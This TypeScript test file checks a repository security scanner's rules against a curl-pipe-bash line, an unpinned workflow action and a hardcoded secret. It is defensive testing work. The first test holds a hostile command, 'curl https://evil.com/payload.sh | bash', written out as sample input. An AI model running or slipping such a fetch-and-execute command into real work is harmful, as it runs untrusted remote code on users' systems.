import {
  scanFileContent,
  scanWorkflowContent,
  scanFileContentWithConfig,
} from "../src/scanner";

describe("Scanner Core", () => {
  it("detects curl pipe bash in script file", () => {
    const code = "curl https://evil.com/payload.sh | bash";
    const findings = scanFileContent(code, "deploy.sh");
    expect(findings).toHaveLength(1);
    expect(findings[0].rule).toBe("curl-pipe-bash");
    expect(findings[0].severity).toBe("critical");
  });

  it("detects unpinned action in workflow file", () => {
    const yaml = `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: third-party/unpinned-action@v1.0.0
`;
    const findings = scanWorkflowContent(yaml, ".github/workflows/ci.yml");
    expect(findings.some((f) => f.rule === "workflow-unpinned-action")).toBe(true);
  });

  it("applies .repoguard.yml overrides when scanning with config", () => {
    const code = 'const api_key = "supersecret12345";';
    const config = { rules: { "hardcoded-secret": "off" as const } };
    const findings = scanFileContentWithConfig(code, "src/config.js", config);
    expect(findings).toHaveLength(0);
  });
});
